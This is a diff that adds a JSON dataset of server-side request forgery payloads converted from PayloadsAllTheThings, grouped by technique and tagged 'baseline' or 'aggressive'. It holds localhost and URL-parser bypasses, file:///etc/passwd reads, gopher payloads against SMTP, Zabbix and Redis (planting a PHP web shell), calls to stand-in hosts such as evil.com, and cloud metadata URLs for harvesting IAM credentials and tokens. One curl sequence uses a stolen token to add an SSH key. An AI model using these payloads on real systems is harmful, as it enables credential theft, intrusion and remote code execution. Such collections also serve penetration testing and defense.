@@ -1,0 +1,414 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "server_side_request_forgery",
+  "original_category": "Server Side Request Forgery",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "url = input(\"Enter URL:\")",
+        "response = requests.get(url)",
+        "return response",
+        "http://169.254.169.254/latest/meta-data/"
+      ]
+    },
+    {
+      "category": "Bypass Localhost with a Domain Redirect",
+      "escalation": "aggressive",
+      "lines": [
+        "NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1"
+      ]
+    },
+    {
+      "category": "Bypass Localhost with CIDR",
+      "escalation": "aggressive",
+      "lines": [
+        "http://127.127.127.127",
+        "http://127.0.1.3",
+        "http://127.0.0.0"
+      ]
+    },
+    {
+      "category": "Bypass Using Rare Address",
+      "escalation": "aggressive",
+      "lines": [
+        "http://0/",
+        "http://127.1",
+        "http://127.0.1"
+      ]
+    },
+    {
+      "category": "Bypass Using DNS Rebinding",
+      "escalation": "aggressive",
+      "lines": [
+        "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "Address: 1.2.3.4",
+        "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+        "Address: 169.254.169.254"
+      ]
+    },
+    {
+      "category": "Bypass Abusing URL Parsing Discrepancy",
+      "escalation": "aggressive",
+      "lines": [
+        "http://127.1.1.1:80\\@127.2.2.2:80/",
+        "http://127.1.1.1:80\\@@127.2.2.2:80/",
+        "http://127.1.1.1:80:\\@@127.2.2.2:80/",
+        "http://127.1.1.1:80#\\@127.2.2.2:80/",
+        "http:127.0.0.1/"
+      ]
+    },
+    {
+      "category": "Bypass PHP filter_var() Function",
+      "escalation": "aggressive",
+      "lines": [
+        "<?php",
+        "echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));",
+        "echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));",
+        "?>"
+      ]
+    },
+    {
+      "category": "Bypass Using JAR Scheme",
+      "escalation": "aggressive",
+      "lines": [
+        "jar:scheme://domain/path!/",
+        "jar:http://127.0.0.1!/",
+        "jar:https://127.0.0.1!/",
+        "jar:ftp://127.0.0.1!/"
+      ]
+    },
+    {
+      "category": "File",
+      "escalation": "aggressive",
+      "lines": [
+        "file:///etc/passwd",
+        "file://\\/\\/etc/passwd"
+      ]
+    },
+    {
+      "category": "HTTP",
+      "escalation": "aggressive",
+      "lines": [
+        "ssrf.php?url=http://127.0.0.1:22",
+        "ssrf.php?url=http://127.0.0.1:80",
+        "ssrf.php?url=http://127.0.0.1:443"
+      ]
+    },
+    {
+      "category": "Dict",
+      "escalation": "aggressive",
+      "lines": [
+        "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>",
+        "ssrf.php?url=dict://attacker:11111/"
+      ]
+    },
+    {
+      "category": "SFTP",
+      "escalation": "aggressive",
+      "lines": [
+        "ssrf.php?url=sftp://evil.com:11111/"
+      ]
+    },
+    {
+      "category": "TFTP",
+      "escalation": "aggressive",
+      "lines": [
+        "ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET"
+      ]
+    },
+    {
+      "category": "LDAP",
+      "escalation": "aggressive",
+      "lines": [
+        "ssrf.php?url=ldap://localhost:11211/%0astats%0aquit"
+      ]
+    },
+    {
+      "category": "Netdoc",
+      "escalation": "aggressive",
+      "lines": [
+        "ssrf.php?url=netdoc:///etc/passwd"
+      ]
+    },
+    {
+      "category": "Gopher",
+      "escalation": "aggressive",
+      "lines": [
+        "gopher://[host]:[port]/[type][selector]",
+        "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"
+      ]
+    },
+    {
+      "category": "Upgrade to XSS",
+      "escalation": "aggressive",
+      "lines": [
+        "https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg"
+      ]
+    },
+    {
+      "category": "DNS AXFR",
+      "escalation": "baseline",
+      "lines": [
+        "from urllib.parse import quote",
+        "domain,tld = \"example.lab\".split('.')",
+        "dns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP",
+        "dns_request += b\"\\x00\\x01\"            # QCOUNT",
+        "dns_request += b\"\\x00\\x00\"            # ANCOUNT",
+        "dns_request += b\"\\x00\\x00\"            # NSCOUNT",
+        "dns_request += b\"\\x00\\x00\"            # ARCOUNT",
+        "dns_request += len(domain).to_bytes() # LEN DOMAIN",
+        "dns_request += domain.encode()        # DOMAIN",
+        "dns_request += len(tld).to_bytes()    # LEN TLD",
+        "dns_request += tld.encode()           # TLD",
+        "dns_request += b\"\\x00\"                # DNAME EOF",
+        "dns_request += b\"\\x00\\xFC\"            # QTYPE AXFR (252)",
+        "dns_request += b\"\\x00\\x01\"            # QCLASS IN (1)",
+        "dns_request = len(dns_request).to_bytes(2, byteorder=\"big\") + dns_request",
+        "print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')",
+        "curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd"
+      ]
+    },
+    {
+      "category": "Memcached",
+      "escalation": "baseline",
+      "lines": [
+        "python2.7 ./gopherus.py --exploit pymemcache",
+        "python2.7 ./gopherus.py --exploit rbmemcache",
+        "python2.7 ./gopherus.py --exploit phpmemcache",
+        "python2.7 ./gopherus.py --exploit dmpmemcache"
+      ]
+    },
+    {
+      "category": "MySQL",
+      "escalation": "baseline",
+      "lines": [
+        "$ python2.7 ./gopherus.py --exploit mysql",
+        "Give MySQL username: root",
+        "Give query to execute: SELECT 123;"
+      ]
+    },
+    {
+      "category": "Redis",
+      "escalation": "baseline",
+      "lines": [
+        "CONFIG SET dir /var/www/html",
+        "CONFIG SET dbfilename file.php",
+        "SET mykey \"<?php system($_GET[0])?>\"",
+        "SAVE"
+      ]
+    },
+    {
+      "category": "SMTP",
+      "escalation": "baseline",
+      "lines": [
+        "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
+        "<?php",
+        "$commands = array(",
+        "'HELO victim.com',",
+        "'MAIL FROM: <admin@victim.com>',",
+        "'RCPT To: <hacker@attacker.com>',",
+        "'DATA',",
+        "'Subject: @hacker!',",
+        "'Hello Friend',",
+        "'.'",
+        ");",
+        "$payload = implode('%0A', $commands);",
+        "header('Location: gopher://0:25/_'.$payload);",
+        "?>"
+      ]
+    },
+    {
+      "category": "WSGI",
+      "escalation": "baseline",
+      "lines": [
+        "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py"
+      ]
+    },
+    {
+      "category": "Zabbix",
+      "escalation": "baseline",
+      "lines": [
+        "gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D"
+      ]
+    },
+    {
+      "category": "SSRF URL for AWS",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]",
+        "http://169.254.169.254/latest/user-data",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/ami-id",
+        "http://169.254.169.254/latest/meta-data/reservation-id",
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://169.254.169.254/latest/meta-data/public-keys/",
+        "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
+        "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document"
+      ]
+    },
+    {
+      "category": "SSRF URL for AWS ECS",
+      "escalation": "baseline",
+      "lines": [
+        "curl http://169.254.170.2/v2/credentials/<UUID>"
+      ]
+    },
+    {
+      "category": "SSRF URL for AWS Elastic Beanstalk",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role"
+      ]
+    },
+    {
+      "category": "SSRF URL for AWS Lambda",
+      "escalation": "baseline",
+      "lines": [
+        "http://localhost:9001/2018-06-01/runtime/invocation/next",
+        "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+      ]
+    },
+    {
+      "category": "SSRF URL for Google Cloud",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+        "http://metadata.google.internal/computeMetadata/v1/instance/id",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true",
+        "http://metadata.google.internal/computeMetadata/v1beta1/",
+        "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true",
+        "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a"
+      ]
+    },
+    {
+      "category": "Add an SSH key",
+      "escalation": "baseline",
+      "lines": [
+        "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json",
+        "$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA",
+        "{",
+        "\"issued_to\": \"101302079XXXXX\",",
+        "\"audience\": \"10130207XXXXX\",",
+        "\"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\",",
+        "\"expires_in\": 2443,",
+        "\"access_type\": \"offline\"",
+        "}",
+        "curl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\"",
+        "-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\"",
+        "-H \"Content-Type: application/json\"",
+        "--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'"
+      ]
+    },
+    {
+      "category": "SSRF URL for Digital Ocean",
+      "escalation": "baseline",
+      "lines": [
+        "curl http://169.254.169.254/metadata/v1/id",
+        "http://169.254.169.254/metadata/v1.json",
+        "http://169.254.169.254/metadata/v1/",
+        "http://169.254.169.254/metadata/v1/id",
+        "http://169.254.169.254/metadata/v1/user-data",
+        "http://169.254.169.254/metadata/v1/hostname",
+        "http://169.254.169.254/metadata/v1/region",
+        "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address",
+        "All in one request:",
+        "curl http://169.254.169.254/metadata/v1.json | jq"
+      ]
+    },
+    {
+      "category": "SSRF URL for Azure",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/metadata/v1/maintenance",
+        "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
+        "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text"
+      ]
+    },
+    {
+      "category": "SSRF URL for OpenStack/RackSpace",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/openstack"
+      ]
+    },
+    {
+      "category": "SSRF URL for HP Helion",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/2009-04-04/meta-data/"
+      ]
+    },
+    {
+      "category": "SSRF URL for Oracle Cloud",
+      "escalation": "baseline",
+      "lines": [
+        "http://192.0.0.192/latest/",
+        "http://192.0.0.192/latest/user-data/",
+        "http://192.0.0.192/latest/meta-data/",
+        "http://192.0.0.192/latest/attributes/"
+      ]
+    },
+    {
+      "category": "SSRF URL for Alibaba",
+      "escalation": "baseline",
+      "lines": [
+        "http://100.100.100.200/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/instance-id",
+        "http://100.100.100.200/latest/meta-data/image-id"
+      ]
+    },
+    {
+      "category": "SSRF URL for Hetzner Cloud",
+      "escalation": "baseline",
+      "lines": [
+        "http://169.254.169.254/hetzner/v1/metadata",
+        "http://169.254.169.254/hetzner/v1/metadata/hostname",
+        "http://169.254.169.254/hetzner/v1/metadata/instance-id",
+        "http://169.254.169.254/hetzner/v1/metadata/public-ipv4",
+        "http://169.254.169.254/hetzner/v1/metadata/private-networks",
+        "http://169.254.169.254/hetzner/v1/metadata/availability-zone",
+        "http://169.254.169.254/hetzner/v1/metadata/region"
+      ]
+    },
+    {
+      "category": "SSRF URL for Kubernetes ETCD",
+      "escalation": "baseline",
+      "lines": [
+        "curl -L http://127.0.0.1:2379/version",
+        "curl http://127.0.0.1:2379/v2/keys/?recursive=true"
+      ]
+    },
+    {
+      "category": "SSRF URL for Docker",
+      "escalation": "baseline",
+      "lines": [
+        "http://127.0.0.1:2375/v1.24/containers/json",
+        "Simple example",
+        "docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash",
+        "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json",
+        "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json"
+      ]
+    },
+    {
+      "category": "SSRF URL for Rancher",
+      "escalation": "baseline",
+      "lines": [
+        "curl http://rancher-metadata/<version>/<path>"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.861Z"
+}
